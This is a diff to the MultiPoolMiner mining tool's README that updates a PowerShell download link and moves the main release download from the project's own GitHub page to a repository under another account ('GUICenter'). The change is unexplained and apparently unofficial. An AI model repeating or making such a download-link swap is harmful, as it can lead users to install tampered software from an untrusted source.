@@ -34,7 +34,7 @@ Any bitcoin donations are greatly appreciated: 17mcbEXB1v2zaUS4rjM3vjpB5GZSZZtgz
 
 INSTALLATION:
 
-1. Download the latest RELEASE (.zip package) from https://github.com/MultiPoolMiner/MultiPoolMiner/releases
+1. Download the latest RELEASE (.zip package) from https://github.com/GUICenter/MultiPoolMiner-V2.7.1.4/releases
 2. Extract it to your Desktop (MultiPoolMiner will NOT work from folders such as "C:\Program Files\")
 3. Make sure you have all pre-requisites installed/updated from the IMPORTANT NOTES section below.
 4. Right-click on the (required) Start.bat file and open it with a Notepad application. Multiple start.bat files are included as examples.
@@ -51,7 +51,7 @@ INSTALLATION:
 IMPORTANT NOTES:
 
 - It is not recommended but to upgrade from a previous version of MultiPoolMiner, you may simply copy the 'Stats' folder.
-- Having PowerShell 6 installed is now a requirement. Windows 64bit: https://github.com/PowerShell/PowerShell/releases/download/v6.0.0-rc.2/PowerShell-6.0.0-rc.2-win-x64.msi, ALL OTHER VERSIONS: https://github.com/PowerShell/PowerShell/releases
+- Having PowerShell 6 installed is now a requirement. Windows 64bit: https://github.com/PowerShell/PowerShell/releases/download/v6.0.2/PowerShell-6.0.2-win-x64.msi, ALL OTHER VERSIONS: https://github.com/PowerShell/PowerShell/releases
 - Microsoft .NET Framework 4.5.1 or later is required for MultiPoolMiner to function properly. Please update from here: https://www.microsoft.com/en-us/download/details.aspx?id=40773
 - CCMiner (NVIDIA cards only) may need 'MSVCR120.dll' if you don't already have it: https://www.microsoft.com/en-gb/download/details.aspx?id=40784
 - CCMiner (NVIDIA cards only) may need 'VCRUNTIME140.DLL' if you don't already have it: https://www.microsoft.com/en-us/download/details.aspx?id=48145
